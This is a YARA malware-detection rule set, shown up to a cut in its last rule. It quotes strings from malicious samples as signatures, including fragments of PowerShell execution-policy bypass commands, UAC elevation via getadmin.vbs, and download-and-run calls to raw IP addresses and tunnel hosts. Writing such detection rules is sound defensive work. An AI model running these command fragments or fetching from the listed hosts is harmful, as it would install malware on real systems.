/*
   YARA Rule Set
   Author: Metin Yigit
   Date: 2025-09-26
   Identifier: _subset_batch
   Reference: internal
*/

/* Rule Set ----------------------------------------------------------------- */

import "pe"

rule sig_5da0babf1d88f9ddcac1e61aed8e82b7_imphash_ {
   meta:
      description = "_subset_batch - file 5da0babf1d88f9ddcac1e61aed8e82b7(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "15c73b193f8389a69451ffcf9c69fab0f0680ec39ba254b336eab9869a56031c"
   strings:
      $x1 = "C:\\Users\\ilya\\Desktop\\fudloader\\x64\\Debug\\fudloader.pdb" fullword ascii /* score: '42.00'*/
      $s2 = "VirginiaLLC.exe" fullword wide /* score: '22.00'*/
      $s3 = "VirginiaLLC binary #fafaa54.exe" fullword wide /* score: '22.00'*/
      $s4 = "%s: \"%s\" - should this be a string literal in single-quotes?" fullword ascii /* score: '17.50'*/
      $s5 = "https://steamcommunity.com/profiles/76561199872628623/" fullword ascii /* score: '17.00'*/
      $s6 = "UPDATE temp.sqlite_master SET sql = sqlite_rename_column(sql, type, name, %Q, %Q, %d, %Q, %d, 1) WHERE type IN ('trigger', 'view" ascii /* score: '16.50'*/
      $s7 = "UPDATE temp.sqlite_master SET sql = sqlite_rename_column(sql, type, name, %Q, %Q, %d, %Q, %d, 1) WHERE type IN ('trigger', 'view" ascii /* score: '16.50'*/
      $s8 = "error in %s %s%s%s: %s" fullword ascii /* score: '16.50'*/
      $s9 = "SqlExec" fullword ascii /* score: '16.00'*/
      $s10 = "D:\\a\\_work\\1\\s\\src\\vctools\\crt\\vcruntime\\src\\eh\\std_type_info.cpp" fullword ascii /* score: '16.00'*/
      $s11 = "D:\\a\\_work\\1\\s\\src\\vctools\\crt\\vcruntime\\src\\internal\\per_thread_data.cpp" fullword ascii /* score: '16.00'*/
      $s12 = "D:\\a\\_work\\1\\s\\src\\vctools\\crt\\vcruntime\\src\\eh\\std_exception.cpp" fullword wide /* score: '16.00'*/
      $s13 = "D:\\a\\_work\\1\\s\\src\\vctools\\crt\\vcruntime\\src\\internal\\winapi_downlevel.cpp" fullword wide /* score: '16.00'*/
      $s14 = "UTF-8 isn't supported in this _mbtowc_l function yet!!!" fullword wide /* score: '16.00'*/
      $s15 = "D:\\a\\_work\\1\\s\\binaries\\amd64ret\\inc\\optional" fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 12000KB and
      1 of ($x*) and 4 of them
}

rule sig_70f591b1a92212c4ebc55629a718d190_imphash_ {
   meta:
      description = "_subset_batch - file 70f591b1a92212c4ebc55629a718d190(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "c7a8844814ec165e61d7c909de1c26f0bf716ddb0da3bf9b156ec424f752824e"
   strings:
      $x1 = "P unzip 1.01 Copyright 1998-2004 Gilles Vollant - http://www.winimage.com/zLibDll" fullword ascii /* score: '32.00'*/
      $s2 = "sciter-x.dll - embeddable Sciter engine" fullword wide /* score: '24.00'*/
      $s3 = "sciterx.dll" fullword wide /* score: '23.00'*/
      $s4 = "attempt to png_read_frame_head() but no acTL present" fullword ascii /* score: '22.00'*/
      $s5 = "sciter-x.dll" fullword ascii /* score: '20.00'*/
      $s6 = "attempt to get property '%s' of nullptr" fullword wide /* score: '19.00'*/
      $s7 = "DyBase error: %d - '%s'" fullword ascii /* score: '18.00'*/
      $s8 = "http://www.digicert.com/CPS0" fullword ascii /* score: '17.00'*/
      $s9 = "http://pki.eset.com/csp0" fullword ascii /* score: '17.00'*/
      $s10 = "fieldset > legend:rtl /* see http://terrainformatica.com/forums/topic.php?id=1772 */" fullword ascii /* score: '17.00'*/
      $s11 = "  } catch(e) { stdout << \"msgbox error - bad button definition:\" << e; }" fullword ascii /* score: '17.00'*/
      $s12 = "widget[type=\"password\"]," fullword ascii /* score: '17.00'*/
      $s13 = "^(ftp|https?)://((\\d+\\.\\d+\\.\\d+\\.\\d+|[_a-zA-Z0-9\\-]+([\\.]+[_a-zA-Z0-9\\-]+)*))(:[0-9]+)?((/[_a-zA-Z0-9\\.\\-]*)+)*(\\?[" wide /* score: '17.00'*/
      $s14 = "w*.dll" fullword wide /* score: '17.00'*/
      $s15 = "Sciter contains libPNG (www.libpng.org), ZLib (www.zlib.org), libJPEG (www.ijg.org), AGG (www.antigrain.com) and DyBase ( www.ga" wide /* score: '17.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 12000KB and
      1 of ($x*) and 4 of them
}

rule sig_4a26dec5b1e0e6897a50979dd20e97b2_imphash_ {
   meta:
      description = "_subset_batch - file 4a26dec5b1e0e6897a50979dd20e97b2(imphash).dll"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "fc2b75531dcefabebd875f43bf0016bcc34363ae64d340418b4c26b0ab6c9e48"
   strings:
      $x1 = "blyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"x86\" publicKe" ascii /* score: '36.00'*/
      $x2 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '35.00'*/
      $s3 = "d:\\ifpay\\libmpos.dll" fullword ascii /* score: '26.00'*/
      $s4 = "SHELL32.dll,4" fullword ascii /* score: '24.00'*/
      $s5 = "E2EECore.%s.dll" fullword ascii /* score: '23.00'*/
      $s6 = "gdrcPay.dll" fullword ascii /* score: '23.00'*/
      $s7 = "<assemblyIdentity name=\"E.App\" processorArchitecture=\"x86\" version=\"5.2.0.0\" type=\"win32\"/><dependency><dependentAssembl" ascii /* score: '22.00'*/
      $s8 = "function get__nodeValue(str_json,recursion){for(var i in str_json){var a=Object.prototype.toString.call(str_json[i]);if(a==\"[ob" ascii /* score: '21.00'*/
      $s9 = "https://openapi.qdlpay.com/gapi/o2o/terminalPlatform/services/queryTerminalBankReportResult" fullword ascii /* score: '20.00'*/
      $s10 = "wshom.ocx" fullword ascii /* reversed goodware string 'xco.mohsw' */ /* score: '20.00'*/
      $s11 = "https://openapi.qdlpay.com/gapi/o2o/terminalPlatform/services/collectInformation" fullword ascii /* score: '20.00'*/
      $s12 = "DB_Execute" fullword ascii /* score: '18.00'*/
      $s13 = "ShellCode" fullword ascii /* score: '18.00'*/
      $s14 = "https://www.koudailingqian.com//epay/order/refund" fullword ascii /* score: '17.00'*/
      $s15 = "yyyy/MM/dd" fullword ascii /* reversed goodware string 'dd/MM/yyyy' */ /* score: '17.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 14000KB and
      1 of ($x*) and 4 of them
}

rule sig_4f6f2a99dd3ff6d728d35eea7b1e557f_imphash_ {
   meta:
      description = "_subset_batch - file 4f6f2a99dd3ff6d728d35eea7b1e557f(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "e2c056c57abb97c1d128ff0f4551d6c6821c89031af687c89c1d51ad89f05fe4"
   strings:
      $s1 = "static.observableusercontent.com" fullword ascii /* score: '29.00'*/
      $s2 = "githubusercontent.com" fullword ascii /* score: '29.00'*/
      $s3 = "appspaceusercontent.com" fullword ascii /* score: '29.00'*/
      $s4 = "lpusercontent.com" fullword ascii /* score: '29.00'*/
      $s5 = "      <assemblyIdentity type='win32' name='Microsoft.Windows.Common-Controls' version='6.0.0.0' publicKeyToken='6595b64144ccf1df" ascii /* score: '27.00'*/
      $s6 = "serveftp.com" fullword ascii /* score: '26.00'*/
      $s7 = "serveirc.com" fullword ascii /* score: '26.00'*/
      $s8 = "hostedpi.com" fullword ascii /* score: '26.00'*/
      $s9 = "logoip.com" fullword ascii /* score: '26.00'*/
      $s10 = "myiphost.com" fullword ascii /* score: '26.00'*/
      $s11 = "appspacehosted.com" fullword ascii /* score: '26.00'*/
      $s12 = "paas.hosted-by-previder.com" fullword ascii /* score: '26.00'*/
      $s13 = "ip.linodeusercontent.com" fullword ascii /* score: '26.00'*/
      $s14 = "nfshost.com" fullword ascii /* score: '26.00'*/
      $s15 = "blogsyte.com" fullword ascii /* score: '26.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 11000KB and
      8 of them
}

rule sig_6e782da5784aca6073ee79ff9a3ade0885d06be986266b9858f353769c3926d6_6e782da5 {
   meta:
      description = "_subset_batch - file 6e782da5784aca6073ee79ff9a3ade0885d06be986266b9858f353769c3926d6_6e782da5.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "6e782da5784aca6073ee79ff9a3ade0885d06be986266b9858f353769c3926d6"
   strings:
      $x1 = "https://scpm.seoul.go.kr/_next/static/chunks/pages/seoul-policy/evt0099-91544bed632ad2be.js?__WB_REVISION__=91544bed632ad2be(sel" ascii /* score: '61.00'*/
      $x2 = "cmd.exe/cpowershell-executionpolicybypass-noproc" fullword ascii /* score: '47.00'*/
      $x3 = "shell.application\"^):uac.shellexecute\"cmd.exe\",\"/kcd\"\"%~sdp0\"\"&&%~s0%params%\",\"\",\"runas\",1>>\"%temp%\\getadmin.vbs" ascii /* score: '45.00'*/
      $x4 = "<s://ameresico.com/wp-content/kours2.png-oc:\\users\\public\\downloads\\" fullword ascii /* score: '45.00'*/
      $x5 = "c:\\windows\\system32\\openssh\\ssh.exe-oproxycommand=\"powershell" fullword ascii /* score: '41.00'*/
      $x6 = "+.run('cmd.exe/c\\\\\\\\targets-hold-role-laundry.trycloudflare$" fullword ascii /* score: '38.00'*/
      $x7 = "c:\\windows\\system32\\cmd.exe\"/min/c\"" fullword ascii /* score: '37.00'*/
      $x8 = "NYcmd.exedropboxg/v/rs^t^art^ms^iexec/^q^n/f^v\"http://0p.rs:8080/avypswfyfs/u1dz0lb9iyzwldujup9yfuvt/!computerV" fullword ascii /* score: '36.00'*/
      $x9 = "icationPassThrough,AppWamClsid,AuthPersistence,AuthPersistSingleRequest,AuthPersistSingleRequestIfProxy,AuthPersistSingleRequest" wide /* score: '36.00'*/
      $x10 = "http://147.45.44.42/boom/trcgi.bat\"$p2=\"c:\\windows\\temp\\cmd" fullword ascii /* score: '34.00'*/
      $x11 = "c:\\windows\\system32\\zipfldr.dll%" fullword ascii /* score: '33.00'*/
      $x12 = "bbj.run(rd+\"-command\\\"$l1='http://79.124.78.109/wp-includes/phyllopodan7v7gd.php';$l2<" fullword ascii /* score: '33.00'*/
      $x13 = "T$urldownloader=\"http://www.angusj.com/resourcehacker/res" fullword ascii /* score: '32.00'*/
      $x14 = "&\\windows\\system32\\cmd.exe" fullword ascii /* score: '32.00'*/
      $x15 = "cmd.cmd?c:\\users\\admini~1\\app" fullword ascii /* score: '32.00'*/
   condition:
      uint16(0) == 0x2e73 and filesize < 12000KB and
      1 of ($x*)
}

rule sig_4ace83536d255c9fadbf556653f111688f7ae90d59de99af9143002972d3f0a0_4ace8353 {
   meta:
      description = "_subset_batch - file 4ace83536d255c9fadbf556653f111688f7ae90d59de99af9143002972d3f0a0_4ace8353.xls"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "4ace83536d255c9fadbf556653f111688f7ae90d59de99af9143002972d3f0a0"
   strings:
      $x1 = "C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\OFFICE12\\MSO.DLL" fullword ascii /* score: '32.00'*/
      $s2 = "                ShellStr = PathZipProgram & \"7z.exe a -r -ppassword -mhe\"                         '                           " ascii /* score: '30.00'*/
      $s3 = "                ShellStr = PathZipProgram & \"7z.exe a -r -ppassword -mhe\"                         '                           " ascii /* score: '30.00'*/
      $s4 = "C:\\PROGRA~2\\COMMON~1\\MICROS~1\\VBA\\VBA6\\VBE6.DLL" fullword ascii /* score: '29.00'*/
      $s5 = "*\\G{2DF8D04C-5BFA-101B-BDE5-00AA0044DE52}#2.4#0#C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\OFFICE12\\MSO.DLL#Micr" wide /* score: '28.00'*/
      $s6 = "22222222222222222222" wide /* reversed goodware string '22222222222222222222' */ /* score: '27.00'*/ /* hex encoded string '""""""""""' */
      $s7 = "sFileName = \"C:\\Users\\765203\\Desktop\\test.csv\"" fullword ascii /* score: '24.00'*/
      $s8 = "*\\G{000204EF-0000-0000-C000-000000000046}#4.0#9#C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\VBA\\VBA6\\VBE6.DLL#Vi" wide /* score: '24.00'*/
      $s9 = "    Private Declare PtrSafe Function GetExitCodeProcess Lib \"kernel32\" (ByVal hProcess As Long, lpExitCode As Long) As Long" fullword ascii /* score: '23.00'*/
      $s10 = "                ShellStr = PathZipProgram & \"7z.exe a -r -seml\"                         '                                  & " ascii /* score: '22.00'*/
      $s11 = "splwow64.exe" fullword ascii /* score: '22.00'*/
      $s12 = "                ShellStr = PathZipProgram & \"7z.exe a -r -seml\"                         '                                  & " ascii /* score: '22.00'*/
      $s13 = "DefPath = \"C:\\Users\\Ron\\ZipFolder\" " fullword ascii /* score: '21.00'*/
      $s14 = "C:\\Program Files (x86)\\Microsoft Office\\Office12\\EXCEL.EXE" fullword ascii /* score: '21.00'*/
      $s15 = "DefPath = \"C:\\Users\\Ron\\ZipFolder\"" fullword ascii /* score: '21.00'*/
   condition:
      uint16(0) == 0xcfd0 and filesize < 4000KB and
      1 of ($x*) and 4 of them
}

rule sig_6d31afca837a52301efa39a1ef82eea1879c68a62400cfe894d4742c8731ef6e_6d31afca {
   meta:
      description = "_subset_batch - file 6d31afca837a52301efa39a1ef82eea1879c68a62400cfe894d4742c8731ef6e_6d31afca.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "6d31afca837a52301efa39a1ef82eea1879c68a62400cfe894d4742c8731ef6e"
   strings:
      $s1 = "YYYYYY[" fullword ascii /* reversed goodware string '[YYYYYY' */ /* score: '17.00'*/
      $s2 = "WWWWWC" fullword ascii /* reversed goodware string 'CWWWWW' */ /* score: '13.50'*/
      $s3 = "VVVVVV@++ " fullword ascii /* score: '8.00'*/
      $s4 = "5eVVV@+ " fullword ascii /* score: '8.00'*/
      $s5 = "eeeeeeeen" fullword ascii /* score: '8.00'*/
      $s6 = "VVVV@+ " fullword ascii /* score: '8.00'*/
      $s7 = "VVVV@++ " fullword ascii /* score: '8.00'*/
      $s8 = "eeeeeen" fullword ascii /* score: '8.00'*/
      $s9 = "eeeeeed" ascii /* score: '8.00'*/
      $s10 = "eeeeeeeeed" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0xd8ff and filesize < 2000KB and
      all of them
}

rule sig_7573dd16f79823bdcecdd59edced8bf2_imphash_ {
   meta:
      description = "_subset_batch - file 7573dd16f79823bdcecdd59edced8bf2(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "29233f9b14ccd56db1b00f51155df7e59ca819fceb4f5b74ded3f16b2daed67c"
   strings:
      $s1 = "SEC_E_ILLEGAL_MESSAGE (0x%08X) - This error usually occurs when a fatal SSL/TLS alert is received (e.g. handshake failed). More " ascii /* score: '23.00'*/
      $s2 = "Failed reading the chunked-encoded stream" fullword ascii /* score: '22.00'*/
      $s3 = "Negotiate: noauthpersist -> %d, header part: %s" fullword ascii /* score: '21.50'*/
      $s4 = "schannel: CertGetNameString() failed to match connection hostname (%s) against server certificate names" fullword ascii /* score: '19.00'*/
      $s5 = "failed to load WS2_32.DLL (%u)" fullword ascii /* score: '19.00'*/
      $s6 = "No more connections allowed to host %s: %zu" fullword ascii /* score: '17.50'*/
      $s7 = "RESOLVE %s:%d is - old addresses discarded!" fullword ascii /* score: '16.50'*/
      $s8 = "Content-Disposition: %s%s%s%s%s%s%s" fullword ascii /* score: '16.00'*/
      $s9 = "Excess found in a read: excess = %zu, size = %I64d, maxdownload = %I64d, bytecount = %I64d" fullword ascii /* score: '16.00'*/
      $s10 = "Content-Type: %s%s%s" fullword ascii /* score: '16.00'*/
      $s11 = "SOCKS4%s: connecting to HTTP proxy %s port %d" fullword ascii /* score: '15.50'*/
      $s12 = "No valid port number in connect to host string (%s)" fullword ascii /* score: '15.00'*/
      $s13 = "SEC_E_ILLEGAL_MESSAGE (0x%08X) - This error usually occurs when a fatal SSL/TLS alert is received (e.g. handshake failed). More " ascii /* score: '15.00'*/
      $s14 = "getaddrinfo() thread failed to start" fullword ascii /* score: '15.00'*/
      $s15 = "Excessive password length for proxy auth" fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule sig_1418e44b536f42ef5db8fd35c961985c_imphash_ {
   meta:
      description = "_subset_batch - file 1418e44b536f42ef5db8fd35c961985c(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "172337dc6a5153770ae99e9730bf524494726f74fad19a3c703cba25eb117652"
   strings:
      $x1 = "costura.guna.ui2.dll.compressed|2.0.4.7|Guna.UI2, Version=2.0.4.7, Culture=neutral, PublicKeyToken=8b9d14aa5142e261|Guna.UI2.dll" ascii /* score: '43.00'*/
      $x2 = "costura.costura.dll.compressed|6.0.0.0|Costura, Version=6.0.0.0, Culture=neutral, PublicKeyToken=9919ef960d84173d|Costura.dll|02" ascii /* score: '41.00'*/
      $x3 = "costura.costura.dll.compressed|6.0.0.0|Costura, Version=6.0.0.0, Culture=neutral, PublicKeyToken=9919ef960d84173d|Costura.dll|02" ascii /* score: '39.00'*/
      $x4 = "costura.guna.ui2.dll.compressed|2.0.4.7|Guna.UI2, Version=2.0.4.7, Culture=neutral, PublicKeyToken=8b9d14aa5142e261|Guna.UI2.dll" ascii /* score: '37.00'*/
      $x5 = "eKeyAuth.api+<login>d__27, RankupServicecleaner, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '35.00'*/
      $x6 = "iKeyAuth.api+<web_login>d__29, RankupServicecleaner, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '35.00'*/
      $x7 = "https://www.epicgames.com/id/login?lang=en-US&noHostRedirect=true&redirectUrl=https%3A%2F%2Fstore.epicgames.com%2Fsite%2Fen-US%2" wide /* score: '35.00'*/
      $x8 = "{spoofer.RankupServicecleaner+<Login_Load>d__25, RankupServicecleaner, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '34.00'*/
      $x9 = "hKeyAuth.api+<download>d__46, RankupServicecleaner, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '33.00'*/
      $x10 = "fKeyAuth.api+<logout>d__28, RankupServicecleaner, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '32.00'*/
      $x11 = "loaderx86.dll" fullword ascii /* score: '32.00'*/
      $x12 = "gKeyAuth.api+<chatget>d__42, RankupServicecleaner, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '32.00'*/
      $x13 = "cKeyAuth.api+<log>d__47, RankupServicecleaner, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '32.00'*/
      $x14 = "fKeyAuth.api+<getvar>d__37, RankupServicecleaner, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" fullword ascii /* score: '32.00'*/
      $x15 = " -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden" fullword wide /* score: '31.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      1 of ($x*)
}

rule sig_110f2fd7d3d3ec3736c5e4f772c3fb9e_imphash_ {
   meta:
      description = "_subset_batch - file 110f2fd7d3d3ec3736c5e4f772c3fb9e(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "fddd55d11a426ea4b462192c3f699312d2c6604d4294a983309928482726d5e6"
   strings:
      $s1 = "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36" fullword ascii /* score: '17.00'*/
      $s2 = "%c:\\(removeable)" fullword ascii /* score: '12.50'*/
      $s3 = "%c:\\(network)" fullword ascii /* score: '12.50'*/
      $s4 = "GET / HTTP/1.1" fullword ascii /* score: '12.00'*/
      $s5 = "prase json string error at " fullword ascii /* score: '9.00'*/
      $s6 = "%c:\\(local)" fullword ascii /* score: '8.50'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 700KB and
      all of them
}

rule sig_4a1588e27a3f322e94e490173fe2bfa8d6e2f407b81a77af8787619b0d3d10bd_4a1588e2 {
   meta:
      description = "_subset_batch - file 4a1588e27a3f322e94e490173fe2bfa8d6e2f407b81a77af8787619b0d3d10bd_4a1588e2.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "4a1588e27a3f322e94e490173fe2bfa8d6e2f407b81a77af8787619b0d3d10bd"
   strings:
      $x1 = "\",\"ras.ru\",\"nyat.app\",\"180r.com\",\"dojin.com\",\"sakuratan.com\",\"sakuraweb.com\",\"x0.com\",\"2-d.jp\",\"bona.jp\",\"cr" ascii /* score: '85.50'*/
      $x2 = "kkinen.fi\",\"hrsn.dev\",\"hashbang.sh\",\"hasura.app\",\"hasura-app.io\",\"hatenablog.com\",\"hatenadiary.com\",\"hateblo.jp\"," ascii /* score: '54.00'*/
      $x3 = "\",\"xyz\",\"yachts\",\"yahoo\",\"yamaxun\",\"yandex\",\"yodobashi\",\"yoga\",\"yokohama\",\"you\",\"youtube\",\"yun\",\"zappos" ascii /* score: '52.00'*/
      $x4 = "\",\"xxx\",\"ye\",\"com.ye\",\"edu.ye\",\"gov.ye\",\"mil.ye\",\"net.ye\",\"org.ye\",\"ac.za\",\"agric.za\",\"alt.za\",\"co.za\"," ascii /* score: '49.00'*/
      $x5 = "!function(){var e,a=Object.getOwnPropertyNames,t=(e,t)=>function(){return t||(0,e[a(e)[0]])((t={exports:{}}).exports,t),t.export" ascii /* score: '41.50'*/
      $x6 = "ma#\",$id:\"https://raw.githubusercontent.com/ajv-validator/ajv/master/lib/refs/data.json#\",description:\"Meta-schema for $data" ascii /* score: '37.00'*/
      $x7 = "ow k.logger.error(\"Error compiling schema, function code:\",_),e}return y.schema=a,y.errors=null,y.refs=j,y.refVal=x,y.root=b?y" ascii /* score: '33.00'*/
      $x8 = "=r.length-e.hostname.length;return e.hasPort?i===e.port&&t:t}))}(e,a)?null:\"http:\"===e.protocol?process.env.HTTP_PROXY||proces" ascii /* score: '32.00'*/
      $x9 = "ley.games\",\"onporter.run\",\"co.bn\",\"postman-echo.com\",\"pstmn.io\",\"mock.pstmn.io\",\"httpbin.org\",\"prequalifyme.today" ascii /* score: '31.00'*/
      $x10 = "i],c=s[n];c&&(s[n]={anyOf:[c,{$ref:\"https://raw.githubusercontent.com/ajv-validator/ajv/master/lib/refs/data.json#\"}]})}}retur" ascii /* score: '31.00'*/
      $x11 = "et2phone.commcenter.command\":{source:\"iana\"},\"text/vnd.radisys.msml-basic-layout\":{source:\"iana\"},\"text/vnd.senx.warpscr" ascii /* score: '31.00'*/
      $s12 = "env.http_proxy||null:\"https:\"===e.protocol&&(process.env.HTTPS_PROXY||process.env.https_proxy||process.env.HTTP_PROXY||process" ascii /* score: '30.00'*/
      $s13 = "},operator:\"isUUID\"}};a.exports=function e(a){var o,i=Object.keys(u);return o=process.env.NODE_NDEBUG?p:function(e,a){e||n(a," ascii /* score: '29.00'*/
      $s14 = "r=l({},o.proxyOptions,{method:\"CONNECT\",path:e.host+\":\"+e.port,agent:!1});r.proxyAuth&&(r.headers=r.headers||{},r.headers[\"" ascii /* score: '29.00'*/
      $s15 = "host),a.uri.port&&(\"80\"===a.uri.port&&\"http:\"===a.uri.protocol||\"443\"===a.uri.port&&\"https:\"===a.uri.protocol)&&a.setHea" ascii /* score: '29.00'*/
   condition:
      uint16(0) == 0x6621 and filesize < 2000KB and
      1 of ($x*) and all of them
}

rule sig_8054ed4a00e159280213636aa14f505f_imphash_ {
   meta:
      description = "_subset_batch - file 8054ed4a00e159280213636aa14f505f(imphash).dll"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "b5686de24dad4ae31f196c95d35c610f3de82de293e077acdce6ba96b2fd1ef1"
   strings:
      $x1 = "                 `DW_CHILDREN_{yes,no}`The specified length is impossibleFound an unknown `DW_FORM_*` typeExpected a zero, found" ascii /* score: '41.00'*/
      $x2 = "DW_AT_nullDW_AT_siblingDW_AT_locationDW_AT_nameDW_AT_orderingDW_AT_byte_sizeDW_AT_bit_offsetDW_AT_bit_sizeDW_AT_stmt_listDW_AT_l" ascii /* score: '39.00'*/
      $x3 = "C:\\a\\c\\d_00000000\\s\\component\\system_interceptors\\source\\crash_handler\\source\\live_kernel_dump.cpp" fullword ascii /* score: '37.00'*/
      $x4 = "system_interceptors::self_defense::SelfDefenseProcessManager::RemoveTemporaryProtectedExecutable " fullword ascii /* score: '36.00'*/
      $x5 = "system_interceptors::self_defense::SelfDefenseProcessManager::AddTemporaryProtectedExecutable " fullword ascii /* score: '36.00'*/
      $x6 = "C:\\a\\c\\d_00000000\\s\\component\\system_interceptors\\source\\process_manager\\source\\process_snapshot.cpp" fullword ascii /* score: '35.00'*/
      $x7 = "C:\\a\\c\\d_00000000\\s\\component\\system_interceptors\\source\\process_manager\\source\\process_control.cpp" fullword ascii /* score: '35.00'*/
      $x8 = "c:\\a\\c\\d_00000000\\s\\product\\kavkis\\ppp_platform\\src\\kav\\common_host_process_factory.cpp" fullword ascii /* score: '35.00'*/
      $x9 = "C:\\a\\c\\d_00000000\\s\\component\\system_interceptors\\source\\self_defense_upgrade_process_waiver_manager\\source\\self_defen" ascii /* score: '35.00'*/
      $x10 = "C:\\a\\c\\d_00000000\\s\\component\\system_interceptors\\source\\process_manager\\source\\process_info.cpp" fullword ascii /* score: '35.00'*/
      $x11 = "C:\\a\\c\\d_00000000\\s\\component\\system_interceptors\\source\\self_defense\\source\\process_manager.cpp" fullword ascii /* score: '35.00'*/
      $x12 = "C:\\a\\c\\d_00000000\\s\\component\\system_interceptors\\source\\process_manager\\source\\process_module_info.cpp" fullword ascii /* score: '35.00'*/
      $x13 = "C:\\a\\c\\d_00000000\\s\\component\\system_interceptors\\source\\self_defense_process_waiver_manager\\source\\self_defense_drive" ascii /* score: '35.00'*/
      $x14 = "C:\\a\\c\\d_00000000\\s\\component\\system_interceptors\\source\\process_manager\\source\\process_module_enumerator.cpp" fullword ascii /* score: '35.00'*/
      $x15 = "C:\\a\\c\\d_00000000\\s\\component\\system_interceptors\\source\\self_defense_process_waiver_manager\\source\\self_defense_proce" ascii /* score: '35.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 9000KB and
      1 of ($x*)
}

rule sig_7c259b4b830b671eb1a91154244617090fb2920e183888aa82577808ae6c26d6_7c259b4b {
   meta:
      description = "_subset_batch - file 7c259b4b830b671eb1a91154244617090fb2920e183888aa82577808ae6c26d6_7c259b4b.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "7c259b4b830b671eb1a91154244617090fb2920e183888aa82577808ae6c26d6"
   strings:
      $s1 = "* HTTP/2.0rSM" fullword ascii /* score: '15.00'*/
      $s2 = "PROT_EXEC|PROT_WRITE failed." fullword ascii /* score: '15.00'*/
      $s3 = "ransport" fullword ascii /* score: '11.00'*/
      $s4 = "333333i" fullword ascii /* reversed goodware string 'i333333' */ /* score: '11.00'*/
      $s5 = "cmdcupd" fullword ascii /* score: '11.00'*/
      $s6 = "EyEVPy3" fullword ascii /* score: '10.00'*/
      $s7 = "ZnZs.MMb" fullword ascii /* score: '10.00'*/
      $s8 = "USERUFY" fullword ascii /* score: '9.50'*/
      $s9 = "myhostnaM9\"uWrz" fullword ascii /* score: '9.00'*/
      $s10 = "os/exect" fullword ascii /* score: '9.00'*/
      $s11 = "kernel/mm/trsparw" fullword ascii /* score: '9.00'*/
      $s12 = "5Y9FTPTZ+@" fullword ascii /* score: '9.00'*/
      $s13 = "2!0-3&023" fullword ascii /* score: '9.00'*/ /* hex encoded string ' 0#' */
      $s14 = "TLDDLLd8XhR0F" fullword ascii /* score: '9.00'*/
      $s15 = "GetMachi" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 8000KB and
      8 of them
}

rule sig_0dac91d571710abf1256a743c4b815f1_imphash_ {
   meta:
      description = "_subset_batch - file 0dac91d571710abf1256a743c4b815f1(imphash).dll"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "651318861fab14b976f96629563874c137e0de5cb405b7b29212380d2a518ccc"
   strings:
      $x1 = "Downloaded new DBGHELP.DLL\"Failed to download new DBGHELP.DLLForcing download of DBGHELP.DLLDeleting existing Minidump file M" wide /* score: '31.00'*/
      $s2 = "Failed to launch BsSndRpt.exe3DBGHELP.DLL too old. Failed to create Minidump file:DBGHELP.DLL does not exist. Failed to create M" wide /* score: '29.00'*/
      $s3 = "http://www.bugsplatsoftware.com/files/dbghelp.dll" fullword ascii /* score: '26.00'*/
      $s4 = "BugSplatHD.exe /p %ld /c \"%s\" /a \"%s\" /v \"%s\"" fullword ascii /* score: '25.00'*/
      $s5 = "C:\\www\\src\\BugSplat\\bin\\BugSplat.pdb" fullword ascii /* score: '25.00'*/
      $s6 = "BugSplat.dll" fullword ascii /* score: '23.00'*/
      $s7 = "BugSplatRc.dll" fullword ascii /* score: '23.00'*/
      $s8 = "Crash reporting module, BugSplat.DLL" fullword wide /* score: '23.00'*/
      $s9 = "BugSplat.DLL" fullword wide /* score: '23.00'*/
      $s10 = "BugSplat.dll: %s  %s" fullword ascii /* score: '22.00'*/
      $s11 = "BsSndRpt.exe" fullword ascii /* score: '22.00'*/
